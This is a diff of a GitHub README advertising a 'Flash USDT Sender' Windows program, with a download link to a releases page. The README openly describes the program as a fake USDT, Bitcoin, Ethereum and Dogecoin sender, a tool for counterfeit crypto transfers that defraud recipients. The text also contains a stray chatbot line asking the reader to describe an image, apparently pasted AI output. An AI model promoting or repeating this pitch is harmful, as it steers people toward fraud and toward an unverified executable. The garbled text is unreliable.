@@ -1,10 +1,13 @@
 <h1 align="center">Flash USDT Sender Trial</h1>
 <h5 align="center">Unlock limitless potentials with just two simple clicks. Send FLASH USDT tokens to over
 40 cryptocurrency exchanges and digital wallets on the blockchain.</h5>
-<p align="center"><img width="250" height="52" src="https://github.com/user-attachments/assets/7bc09a0a-1d83-42a1-9559-0e2e700df24f"></p>
+<p align="center"><img width="250" height="52" src="https://github.com/user-attachments/assets/7bc09a0a-1d83-42a1-9559-0e2e700df24f">
+  
+<video src="" width="300" />
 
 
 
+</p>
 Could you please describe the image you mentioned? That way, I can understand your request better and assist you accordingly.\
 Our software is currently available for trial on [FLASH USDT SENDER](https://github.com/VCamPro/Flash-USDT/releases/tag/TRUST"). Download it here \
 It is available for Windows PC devices. This is a powerful software that can also be called a fake USDT sender, fake Bitcoin sender, fake Ethereum sender, fake Dogecoin sender, fake Litecoin sender, and more!\
